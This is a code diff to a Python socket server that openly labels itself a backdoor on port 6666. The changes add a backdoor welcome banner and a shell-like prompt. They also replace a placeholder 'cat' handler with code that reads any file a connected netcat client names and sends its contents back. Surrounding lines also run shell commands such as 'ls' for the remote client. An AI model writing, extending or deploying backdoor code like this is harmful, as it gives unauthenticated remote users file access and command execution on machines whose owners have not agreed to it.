@@ -47,13 +47,14 @@ def server_connector():
     while True:
         clientSocket, addr = server.accept()
         print("NC Client has connected via" + addr[0] + ":" + str(addr[1]))
+        clientSocket.send(bytearray("Welcome to 6666 backdoor: \n","utf-8"))
         server_listener(clientSocket,server)
 
 
 ## this function deals with netcat commands from client connection
 def server_listener(clientSocket,server):
     while True:
-        clientSocket.send(bytearray("Welcome Boss: \n","utf-8"))
+        clientSocket.send(bytearray("\n$","utf-8"))
         bashCommand = ''
         while "\n" not in bashCommand:
             bashCommand = clientSocket.recv(1024).decode()
@@ -76,7 +77,14 @@ def server_listener(clientSocket,server):
             output = subprocess.check_output(['ls'])
 
         elif ( ('cat' in bashCommand ) & ( len(bash_args) == 2) ):
-            output = "cat doing some cool stuff\n".encode()
+            try:
+                print(bash_args[1])
+                buffer = ""
+                buffer += open(bash_args[1]).read()
+                output = buffer.encode()
+            except:
+                output = "file doesn't exist\nusage: $cat <filename>\n"
+                output = output.encode()
 
         elif bashCommand == 'off':
             server.shutdown(1)
